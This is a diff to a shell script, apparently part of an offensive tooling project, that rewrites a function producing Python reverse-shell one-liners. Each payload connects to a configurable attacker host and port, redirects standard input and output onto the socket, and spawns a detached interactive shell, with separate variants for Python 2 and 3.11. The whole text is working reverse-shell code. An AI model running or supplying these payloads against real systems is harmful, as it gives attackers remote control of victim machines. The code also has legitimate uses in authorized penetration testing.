@@ -49,13 +49,20 @@ get_perl_reverse_shell() {
 }
 get_python_reverse_shell() {
     prepare_generic_linux_shell
-    local reverse_shell='import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$host_ip'",'$host_port'));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.Popen(["'$default_shell'", "-i"]);'
+    local reverse_shell='import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$host_ip'",'$host_port'));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.Popen(["'$default_shell'", "-i"], preexec_fn=os.setsid);'
     local python_exe=""
     if [[ -z $python_version ]]; then
+        #assume it is 3.5 - 3.10
         python_exe="python3"
     elif [[ $python_version == "2" ]]; then
         python_exe="python"
+        reverse_shell='import sys,subprocess,socket,os,pty;s=socket.socket();s.connect(("'$host_ip'",'$host_port'));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.Popen(["'$default_shell'", "-i"], preexec_fn=os.setsid, close_fds=True);'
     elif [[ $python_version == "3" ]]; then
+        python_exe="python3"
+    elif [[ $python_version == "3.11" ]]; then
+        #for 3.11 and above we should use process groups to detach the shell, but it's not working well
+        #stick to the old method for now
+        reverse_shell='import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'$host_ip'",'$host_port'));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.Popen(["'$default_shell'", "-i"], process_group=0);'
         python_exe="python3"
     else
         python_exe="python3"
